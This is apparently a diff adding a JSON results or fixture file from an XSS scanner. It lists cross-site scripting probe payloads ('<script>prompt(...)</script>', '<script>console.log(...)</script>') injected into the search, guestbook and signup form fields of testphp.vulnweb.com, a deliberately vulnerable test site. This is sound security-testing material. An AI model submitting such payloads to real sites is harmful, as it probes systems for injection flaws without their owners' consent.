@@ -1,1 +1,36 @@
-[]
+[
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "data": {
+            "searchFor": "<script>prompt(5000/200)</script>",
+            "goButton": "goButton"
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/search.php?test=query",
+        "data": {
+            "searchFor": "<script>console.log(5000/3000)</script>",
+            "goButton": "goButton"
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/guestbook.php",
+        "data": {
+            "name": "<script>console.log(5000/3000)</script>",
+            "submit": "submit"
+        }
+    },
+    {
+        "url": "http://testphp.vulnweb.com/secured/newuser.php",
+        "data": {
+            "uuname": "<script>console.log(5000/3000)</script>",
+            "upass": "<script>console.log(5000/3000)</script>",
+            "upass2": "<script>console.log(5000/3000)</script>",
+            "urname": "<script>console.log(5000/3000)</script>",
+            "ucc": "<script>console.log(5000/3000)</script>",
+            "uemail": "<script>console.log(5000/3000)</script>",
+            "uphone": "<script>console.log(5000/3000)</script>",
+            "signup": "signup"
+        }
+    }
+]
